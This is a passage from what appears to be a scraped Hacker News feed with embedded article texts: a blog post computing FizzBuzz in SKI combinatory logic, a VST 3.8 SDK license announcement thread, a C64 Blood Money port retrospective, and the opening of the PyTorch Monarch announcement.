)((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K)))))))(((((S)((K)(S)))(K))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(K))))((K)(((S)(K))(K)))))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(S))((K)(((S)(K))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(S))((K)(((S)(K))(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))))));&lt;/code&gt;
    &lt;p&gt;It’s time. You press enter.&lt;/p&gt;
    &lt;p&gt;Several seconds go by.&lt;/p&gt;
    &lt;p&gt;The tension is invigorating.&lt;/p&gt;
    &lt;p&gt;Suddenly, the terminal fills with output:&lt;/p&gt;
    &lt;code&gt;1
2
fizz
4
buzz
fizz
7
8
fizz
buzz
11
fizz
13
14
fizzbuzz
16
17
fizz
19
buzz
fizz
22
23
fizz
buzz
26
fizz
28
29
fizzbuzz
31
32
fizz
34
buzz
fizz
37
38
fizz
buzz
41
fizz
43
44
fizzbuzz
46
47
fizz
49
buzz
fizz
52
53
fizz
buzz
56
fizz
58
59
fizzbuzz
61
62
fizz
64
buzz
fizz
67
68
fizz
buzz
71
fizz
73
74
fizzbuzz
76
77
fizz
79
buzz
fizz
82
83
fizz
buzz
86
fizz
88
89
fizzbuzz
91
92
fizz
94
buzz
fizz
97
98
fizz
buzz&lt;/code&gt;
    &lt;p&gt;You lean back, exhausted but triumphant.&lt;/p&gt;
    &lt;p&gt;Dana is dead.&lt;/p&gt;
    &lt;head rend="h2"&gt;What the heck did I just read?&lt;/head&gt;
    &lt;p&gt;The culmination of months of effort!&lt;/p&gt;
    &lt;p&gt;Combinatory logic is a model of computation that is extremely minimal. All you start with are two functions: &lt;code&gt;S&lt;/code&gt; and &lt;code&gt;K&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;S&lt;/code&gt;is a function that, given three functions&lt;code&gt;x&lt;/code&gt;,&lt;code&gt;y&lt;/code&gt;, and&lt;code&gt;z&lt;/code&gt;, returns&lt;code&gt;x(z)(y(z))&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;K&lt;/code&gt;is a function that, given two functions&lt;code&gt;x&lt;/code&gt;and&lt;code&gt;y&lt;/code&gt;, returns&lt;code&gt;x&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You can compute anything you want just by passing these two functions into each other. For example, the identity function &lt;code&gt;I = (x) =&amp;gt; x&lt;/code&gt; can be expressed as &lt;code&gt;S(K)(K)&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;And you can build up arbitrarily complex functions from there. There is no limit.&lt;/p&gt;
    &lt;p&gt;Combinatory logic is basically lambda calculus without variables. Despite this limitation, combinatory logic is still Turing complete.&lt;/p&gt;
    &lt;p&gt;It is also extremely difficult to understand.&lt;/p&gt;
    &lt;head rend="h2"&gt;Further reading&lt;/head&gt;
    &lt;p&gt;If you found this post interesting (whether or not you understood it), the following resources would be good places start exploring:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;To Mock a Mockingbird, by Raymond Smullyan&lt;/item&gt;
      &lt;item&gt;Programming with Nothing, by Tom Stuart&lt;/item&gt;
      &lt;item&gt;Kyle Kingsbury’s Technical Interview series&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In particular, I strongly recommend reading To Mock a Mockbird if you want to understand combinatory logic. It’s the most fun, accessible way to learn combinatory logic from scratch. It took me about a month’s spare time to work through it. Time well spent!&lt;/p&gt;
    &lt;head rend="h3"&gt;Skoobert&lt;/head&gt;
    &lt;p&gt;After reading To Mock a Mockingbird, I wanted to program in combinatory logic but found existing tools lacking. So I spent a weekend building Skoobert, which is intended to be the ideal programming language for experimenting with lambda calculus and combinatory logic. Give it a try and let me know what you think!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://joshmoody.org/blog/programming-with-less-than-nothing/"/><published>2025-10-23T05:42:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45678549</id><title>VST3 audio plugin format is now MIT</title><updated>2025-10-23T15:37:59.928947+00:00</updated><content>&lt;doc fingerprint="3d5716530856fbdc"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;div&gt;Yvan
1&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;VST 3.8 SDK Released&lt;/p&gt;
        &lt;p&gt;Dear VST Developers,&lt;/p&gt;
        &lt;p&gt;Steinberg Media Technologies today releases the VST SDK 3.8&lt;/p&gt;
        &lt;p&gt;Here’s a brief overview of changes:&lt;/p&gt;
        &lt;head rend="h1"&gt;Version 3.8.0 (2025/10/20)&lt;/head&gt;
        &lt;p&gt;The SDK can be downloaded here:&lt;/p&gt;
        &lt;p&gt;Online documentation available under:&lt;lb/&gt; VST - VST 3 Developer Portal (steinbergmedia.github.io)&lt;/p&gt;
        &lt;p&gt;Main VST page: vstdev.org&lt;/p&gt;
        &lt;p&gt;Your Steinberg Team&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 14 Likes &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;Congratulations! Great to see both MIDI 2.0 and the new MIT license together!&lt;/p&gt;
        &lt;p&gt;Pete&lt;lb/&gt; Microsoft&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 1 Like &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;Great news!&lt;/p&gt;
        &lt;p&gt;FYI the SSL cert for https://vstdev.org/ doesn’t seem to be correct.&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;rhansen
5&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;I assume it is correct. The domain vstdev.org just forwards to VSTDev (on github.io) where the website resides. Is your browser complaining about that?&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;Thank you for the release and thank you for changing the Licensing. That is a monumental change!&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 1 Like &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;it’s working now. not sure what was wrong earlier. thanks!&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 1 Like &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;rewgs
8&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;Wow, this is huge!! Not just the MIT license, not just MIDI 2.0, but Wayland support as well?! This Linux nerd is very happy. Thank you all!!&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 2 Likes &lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://forums.steinberg.net/t/vst-3-8-0-sdk-released/1011988"/><published>2025-10-23T05:48:02+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45678603</id><title>Radios, how do they work? (2024)</title><updated>2025-10-23T15:37:59.854207+00:00</updated><content/><link href="https://lcamtuf.substack.com/p/radios-how-do-they-work"/><published>2025-10-23T05:56:23+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45679638</id><title>C64 Blood Money</title><updated>2025-10-23T15:37:59.498770+00:00</updated><content>&lt;doc fingerprint="361d31264aa02c3d"&gt;
  &lt;main&gt;
    &lt;p&gt;While I still remember the details, I thought I’d go over my port of Blood Money to the C64. It had some really cool bits in it, and I had great fun doing it. Some parts make me cringe a little now, so it’d be interesting to revive it, and see if I can get it building again – or at the very least, go over the code again…&lt;/p&gt;
    &lt;p&gt;One thing that DID bug me, even back then, was the crappy starfield. It was just some characters stuck in the map, and it sucked.&lt;/p&gt;
    &lt;p&gt;So what were the main components?&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Multi-Directional scrolling&lt;/item&gt;
      &lt;item&gt;Sprite Multiplexor&lt;/item&gt;
      &lt;item&gt;Scripting&lt;/item&gt;
      &lt;item&gt;Sprite compression&lt;/item&gt;
      &lt;item&gt;Turrets&lt;/item&gt;
      &lt;item&gt;Character sprites&lt;/item&gt;
      &lt;item&gt;Bullets / Weapons&lt;/item&gt;
      &lt;item&gt;Collision&lt;/item&gt;
      &lt;item&gt;Shop&lt;/item&gt;
      &lt;item&gt;Front End&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These are the major parts and we’ll take them one at a time. Before that, I want to briefly look over the code, and talk about the devkit – PDS. Programmers Development System. This was a lovely system, and one I’m sad I didn’t find while raiding the DMA Offices.&lt;/p&gt;
    &lt;p&gt;The PDS system consisted of a PC ISA card, and a C64 cartridge. The ISA card was common for all systems, while the target cartridge was custom for each platform.&lt;/p&gt;
    &lt;p&gt;As I can’t find a C64 image, here’s the Sam Coupé (Z80) one to show what it might look like.&lt;lb/&gt;EDIT: So with the RMC Cave opening up a “Dev Den“, Jason who is running that part, had a C64 one and it turns out there isn’t an interface, just a user port connector. This makes sense as the C64 already has everything it needs to read/write bytes in parallel.&lt;/p&gt;
    &lt;p&gt;This is the Z80 program, but the 6502 one was the same. It consisted of a built in text editor/assembler/debugger. The text editor could hold 8 files up to a maximum of 32k each, though you could include as many files as you like. It assembled before your finger left the key, and squired down in under a second. This was a massive speed boost from the 20 minutes I sometimes spent waiting on the C64 to disk assemble using a fast parallel disk interface.&lt;/p&gt;
    &lt;p&gt;The other good thing about PDS, is it remembers the start date, and the last time you touched it – which is very cool and handy. So I started this on 7th of August 1989…. though, this probably isn’t right. This was the month the office opened, and I was still working on Ballistix at this point. However, I did create a C64 framework, and then probably based the game off that. The date below 2/10/89 looks better, and the end date looks about right 25/4/90. Games back then took about 6 months, so this also fits.&lt;/p&gt;
    &lt;p&gt;So in the main code of all my C64 games, I setup equates (constants), and zero page and normal variables. On the 6502 there are 256 bytes of fast zero page, 2 are taken with I/O control, and the rest are available for use. Zero page instructions typically take 1 cycle less to operate, so are highly desirable for critical code optimisations.&lt;/p&gt;
    &lt;p&gt;These are some of the constants. At the top you can see the big ticket items – memory map etc. There’s a couple of interesting items here – Charmasks/Shipmasks, and down_load. The collision in Blood Money wasn’t character based, it was bitmap based. I actually read the background tiles, and then masked whatever frame of the ship was active onto these characters. This was pretty slow, but allowed proper collision to the background – something that was vital in later levels. I’ll discuss this mode later of course…&lt;/p&gt;
    &lt;p&gt;down_load – this was where the debugger/downloader code lived. Whenever the C64 hit a BRK instruction, I would detect this in the IRQ it generated, and jumped to the PDS debugger code.&lt;/p&gt;
    &lt;p&gt;This is how I allocated Zero Page variables. Prior to having good macros, I’d have to work these out manually, but now I was able to simple set a name and how many bytes I wanted, and the label would be set. I still use this method for variable allocation when need be – it’s really useful.&lt;/p&gt;
    &lt;p&gt;I use the same method for sprite variable allocation. Have to say… this is a lot of variables for each sprite – oh well….&lt;/p&gt;
    &lt;p&gt;And this is where I defined general variables, and player structure. There’s 2 of everything as Blood Money is a simultaneous 2 player game. This really effected the multiplexor – but more on that later….&lt;/p&gt;
    &lt;p&gt;Lastly for today, is the start up code, we take over everything and nuke stack and zero page, flick out ROMs etc and setup IRQs – the usual…&lt;/p&gt;
    &lt;p&gt;The IRQs in Blood Money are complicated, and heavily tied to the multiplexor, so I’ll talk about that next time…..&lt;/p&gt;
    &lt;p&gt;Also just to say…. as this was just my second game, and only a couple of months after the office opened, I’m amazed at the level of commenting in the source! 😂&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://lemmings.info/c64-blood-money/"/><published>2025-10-23T08:41:21+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680237</id><title>PyTorch Monarch</title><updated>2025-10-23T15:37:59.335272+00:00</updated><content>&lt;doc fingerprint="bddc819de3a94aa8"&gt;
  &lt;main&gt;
    &lt;p&gt;We now live in a world where ML workflows (pre-training, post training, etc) are heterogeneous, must contend with hardware failures, are increasingly asynchronous and highly dynamic. Traditionally, PyTorch has relied on an HPC-style multi-controller model, where multiple copies of the same script are launched across different machines, each running its own instance of the application (often referred to as SPMD). ML workflows are becoming more complex: pre-training might combine advanced parallelism with asynchrony and partial failure; while RL models used in post-training require a high degree of dynamism with complex feedback loops. While the logic of these workflows may be relatively straightforward, they are notoriously difficult to implement well in a multi-controller system, where each node must decide how to act based on only a local view of the workflow’s state.&lt;/p&gt;
    &lt;p&gt;We believe that the long-term sustainable way to address this is through a single controller programming model, in which a single script orchestrates all distributed resources, making them feel almost local. This architectural shift simplifies distributed programming—your code looks and feels like a single-machine Python program, but can scale across thousands of GPUs. You can directly use Pythonic constructs—classes, functions, loops, tasks, futures—to express complex distributed algorithms.&lt;/p&gt;
    &lt;p&gt;We’re excited to introduce Monarch, a distributed programming framework that brings the simplicity of single-machine PyTorch to entire clusters.&lt;/p&gt;
    &lt;p&gt;Monarch lets you program distributed systems the way you’d program a single machine, hiding the complexity of distributed computing:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Program clusters like arrays. Monarch organizes hosts, processes, and actors into scalable meshes that you can manipulate directly. You can operate on entire meshes (or slices of them) with simple APIs—Monarch handles the distribution and vectorization automatically, so you can think in terms of what you want to compute, not where the code runs.&lt;/item&gt;
      &lt;item&gt;Progressive fault handling. With Monarch, you write your code as if nothing fails. When something does fail, Monarch fails fast by default—stopping the whole program, just like an uncaught exception in a simple local script. Later, you can progressively add fine-grained fault handling exactly where you need it, catching and recovering from failures just like you’d catch exceptions.&lt;/item&gt;
      &lt;item&gt;Separate control from data. Monarch splits control plane (messaging) from data plane (RDMA transfers), enabling direct GPU-to-GPU memory transfers across your cluster. Monarch lets you send commands through one path, while moving data through another, optimized for what each does best.&lt;/item&gt;
      &lt;item&gt;Distributed tensors that feel local. Monarch integrates seamlessly with PyTorch to provide tensors that are sharded across clusters of GPUs. Monarch tensor operations look local but are executed across distributed large clusters, with Monarch handling the complexity of coordinating across thousands of GPUs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Programming Model&lt;/head&gt;
    &lt;head rend="h4"&gt;Key APIs: Process and Actor Meshes&lt;/head&gt;
    &lt;p&gt;Monarch organizes resources into multidimensional arrays, or meshes. A process mesh is an array of processes spread across many hosts; an actor mesh is an array of actors, each running inside a separate process. Like array programming in NumPy or PyTorch, meshes make it simple to dispatch operations efficiently across large systems.&lt;/p&gt;
